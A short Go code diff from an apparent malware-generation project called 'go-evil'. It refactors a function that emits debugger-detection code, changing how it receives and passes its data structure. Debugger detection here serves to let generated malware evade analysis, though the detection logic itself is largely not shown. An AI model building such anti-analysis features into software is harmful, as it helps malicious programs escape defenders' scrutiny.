@@ -1,13 +1,12 @@
 package debugger
 
 import (
-	"github.com/TeamPhoneix/go-evil/utility/structure"
 	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
 )
 
 // Generate the debugger detection function
-func stop_behavior(s_json string) string {
-	data_object := structure.Receive(s_json)
+func stop_behavior(data_object *json.Json_t) {
 
 	body := []string{
 		"toReturn := false",
@@ -21,5 +20,4 @@ func stop_behavior(s_json string) string {
 	data_object.Add_go_function(functions.Go_func_t{Name: "stop_behavior", Func_type: "null", Return_type: "bool", Gut: body})
 	data_object.Add_go_import("os")
 
-	return structure.Send(data_object)
 }
